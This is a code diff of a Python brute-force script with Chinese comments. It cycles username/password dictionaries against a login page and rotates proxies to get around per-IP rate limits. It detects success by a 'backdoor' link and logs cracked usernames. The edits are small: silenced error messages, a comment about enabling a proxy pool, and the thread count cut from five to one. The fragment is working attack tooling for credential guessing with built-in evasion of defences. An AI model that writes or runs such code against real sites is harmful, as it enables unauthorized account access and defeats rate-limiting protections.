@@ -47,6 +47,7 @@ def login_bypass_ip_limit():
                     CUR_PROXY = utils.get_proxy()
                     print("当前使用代理:{}".format(CUR_PROXY))
                     continue
+
                 elif soup.find('a', attrs={'id':'backdoor'}):
                     # 用户名密码正确，成功登录
                     print("登录成功")
@@ -54,11 +55,13 @@ def login_bypass_ip_limit():
                     success_username.append(username)
                     stop_brute()
                     return True
+
                 elif soup.find('span',text='用户名或密码错误！'):
                     print("用户名或密码错误")
                     return False
             else:
-                print("连接异常")
+                # print("连接异常")
+                pass
 
         except requests.exceptions.ConnectionError:
             print("代理不可用,更换代理")
@@ -70,7 +73,8 @@ def login_bypass_ip_limit():
             print("当前使用代理:{}".format(CUR_PROXY))
 
         except:
-            print('未知情况')
+            # print('未知情况')
+            pass
 
 def get_dict(dict_user, dict_pass):
     """
@@ -101,9 +105,11 @@ def get_parse() -> dict:
 
 
 if __name__ == "__main__":
+    # 开启代理池
+
     args = get_parse()
     dict_username = args.get('dict_username', "username.txt")
     dict_password = args.get('dict_password', "password.txt")
     get_dict(dict_username, dict_password)
 
-    bruteforce(login_bypass_ip_limit, thread_num=5)
+    bruteforce(login_bypass_ip_limit, thread_num=1)
